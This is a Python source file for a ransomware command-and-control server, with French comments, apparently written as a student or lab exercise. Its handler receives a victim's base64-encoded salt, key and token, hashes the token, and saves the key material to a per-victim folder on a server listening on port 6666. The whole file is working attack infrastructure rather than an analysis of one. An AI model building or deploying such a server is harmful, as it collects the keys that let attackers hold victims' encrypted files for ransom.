import base64
from hashlib import sha256
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        """
        Envoie du dictionnaire vers le CNC

        Args:
            body: dictionnaire avec la clé le sel et le token
        """
        # Decodage du payload
        salt = base64.b64decode(body["salt"])
        key = base64.b64decode(body["key"])
        token = base64.b64decode(body["token"])
        
        # Génération du token hashé
        hash_token = sha256(token).hexdigest()
        
        # Création du dossier relié
        dir_to_make = os.path.join(CNC.ROOT_PATH, hash_token)
        os.makedirs(dir_to_make, exist_ok=True)
        
        # Sauvegarde de la clé et du sel dans un fichier binaire
        with open(os.path.join(dir_to_make, "salt.bin"), "wb") as file_salt:
            file_salt.write(salt)
        with open(os.path.join(dir_to_make, "key.bin"), "wb") as file_key:
            file_key.write(key)
        
        if os.path.isdir(dir_to_make):
            return {"status" : "Success"}
        else:
            return {"status" : "Error"}
        
        
           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()